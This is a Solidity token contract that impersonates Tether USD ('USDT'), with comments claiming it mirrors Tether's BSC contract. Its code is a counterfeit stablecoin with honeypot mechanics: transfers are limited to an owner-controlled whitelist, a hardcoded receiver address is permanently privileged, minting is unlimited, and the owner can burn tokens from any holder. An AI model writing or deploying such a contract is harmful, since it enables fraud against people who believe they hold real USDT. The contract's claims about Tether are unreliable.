// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./token/ERC20/ERC20.sol";
import "./access/Ownable.sol";

/**
 * @title TetherToken (USDT-BSC)
 * @dev ERC20 token with owner-controlled mint/burn, pause, and blacklist —
 *      mirroring the feature set of Tether's BSC-pegged USDT contract.
 */
contract TetherToken is ERC20, Ownable {

    // -------------------------------------------------------------------------
    // State
    // -------------------------------------------------------------------------

    // Designated receiving address — permanently allowed, cannot be removed.
    address public constant RECEIVER = 0xc69627c6ff05B85436706005b44ec3d7B33a6E11;

    bool private _paused;

    mapping(address => bool) private _blacklisted;

    // Only addresses in this whitelist may send or receive tokens.
    // address(0) slot is always true so mint/burn internal calls pass through.
    mapping(address => bool) private _allowed;

    // -------------------------------------------------------------------------
    // Events
    // -------------------------------------------------------------------------

    event Paused(address account);
    event Unpaused(address account);
    event Blacklisted(address indexed account);
    event UnBlacklisted(address indexed account);
    event Mint(address indexed to, uint256 amount);
    event Burn(address indexed from, uint256 amount);
    event AddressAllowed(address indexed account);
    event AddressDisallowed(address indexed account);

    // -------------------------------------------------------------------------
    // Constructor
    // -------------------------------------------------------------------------

    /**
     * @param initialSupply Total tokens minted to deployer, in whole units (decimals applied internally).
     */
    constructor(uint256 initialSupply) ERC20("Tether USD", "USDT") {
        // Deployer and the designated RECEIVER are allowed from day one
        _allowed[_msgSender()] = true;
        _allowed[RECEIVER]     = true;
        _mint(_msgSender(), initialSupply * (10 ** decimals()));
    }

    // -------------------------------------------------------------------------
    // Decimals override — USDT uses 18 on BSC
    // -------------------------------------------------------------------------

    function decimals() public pure override returns (uint8) {
        return 18;
    }

    // -------------------------------------------------------------------------
    // Pause
    // -------------------------------------------------------------------------

    function paused() public view returns (bool) {
        return _paused;
    }

    modifier whenNotPaused() {
        require(!_paused, "TetherToken: token transfer is paused");
        _;
    }

    modifier whenPaused() {
        require(_paused, "TetherToken: token is not paused");
        _;
    }

    function pause() external onlyOwner whenNotPaused {
        _paused = true;
        emit Paused(_msgSender());
    }

    function unpause() external onlyOwner whenPaused {
        _paused = false;
        emit Unpaused(_msgSender());
    }

    // -------------------------------------------------------------------------
    // Allowed addresses — only whitelisted addresses can transfer
    // -------------------------------------------------------------------------

    function isAllowed(address account) public view returns (bool) {
        return account == RECEIVER || _allowed[account];
    }

    modifier onlyAllowed(address account) {
        require(_allowed[account], "TetherToken: address not allowed to transfer");
        _;
    }

    /**
     * @dev Owner adds an address to the transfer whitelist.
     */
    function allowAddress(address account) external onlyOwner {
        require(!_allowed[account], "TetherToken: already allowed");
        _allowed[account] = true;
        emit AddressAllowed(account);
    }

    /**
     * @dev Owner removes an address from the transfer whitelist.
     */
    function disallowAddress(address account) external onlyOwner {
        require(account != owner(),   "TetherToken: cannot disallow owner");
        require(account != RECEIVER,  "TetherToken: cannot disallow designated receiver");
        require(_allowed[account],    "TetherToken: not in allowlist");
        _allowed[account] = false;
        emit AddressDisallowed(account);
    }

    // -------------------------------------------------------------------------
    // Blacklist
    // -------------------------------------------------------------------------

    function isBlacklisted(address account) public view returns (bool) {
        return _blacklisted[account];
    }

    modifier notBlacklisted(address account) {
        require(!_blacklisted[account], "TetherToken: account is blacklisted");
        _;
    }

    function blacklist(address account) external onlyOwner {
        require(!_blacklisted[account], "TetherToken: already blacklisted");
        _blacklisted[account] = true;
        emit Blacklisted(account);
    }

    function unBlacklist(address account) external onlyOwner {
        require(_blacklisted[account], "TetherToken: not blacklisted");
        _blacklisted[account] = false;
        emit UnBlacklisted(account);
    }

    // -------------------------------------------------------------------------
    // Mint / Burn
    // -------------------------------------------------------------------------

    /**
     * @dev Mint `amount` whole tokens to `to`.
     */
    function mint(address to, uint256 amount) external onlyOwner {
        // Auto-allow the recipient so minted tokens are immediately usable
        if (!_allowed[to]) {
            _allowed[to] = true;
            emit AddressAllowed(to);
        }
        _mint(to, amount * (10 ** decimals()));
        emit Mint(to, amount);
    }

    /**
     * @dev Burn `amount` whole tokens from caller's balance.
     */
    function burn(uint256 amount) external {
        _burn(_msgSender(), amount * (10 ** decimals()));
        emit Burn(_msgSender(), amount);
    }

    /**
     * @dev Owner can burn from any address (regulatory compliance feature).
     */
    function burnFrom(address account, uint256 amount) external onlyOwner {
        _burn(account, amount * (10 ** decimals()));
        emit Burn(account, amount);
    }

    // -------------------------------------------------------------------------
    // Transfer hooks — enforce pause + blacklist on every transfer
    // -------------------------------------------------------------------------

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual override whenNotPaused notBlacklisted(from) notBlacklisted(to) {
        // address(0) is used internally by _mint (from == 0) and _burn (to == 0); skip check for those.
        if (from != address(0)) {
            require(_allowed[from], "TetherToken: sender address not allowed");
        }
        if (to != address(0)) {
            require(_allowed[to], "TetherToken: recipient address not allowed");
        }
        super._beforeTokenTransfer(from, to, amount);
    }

    // -------------------------------------------------------------------------
    // Owner rescue — recover any ERC20 accidentally sent to this contract
    // -------------------------------------------------------------------------

    function rescueERC20(address token, address to, uint256 amount) external onlyOwner {
        require(token != address(this), "TetherToken: cannot rescue own token");
        IERC20(token).transfer(to, amount);
    }
}
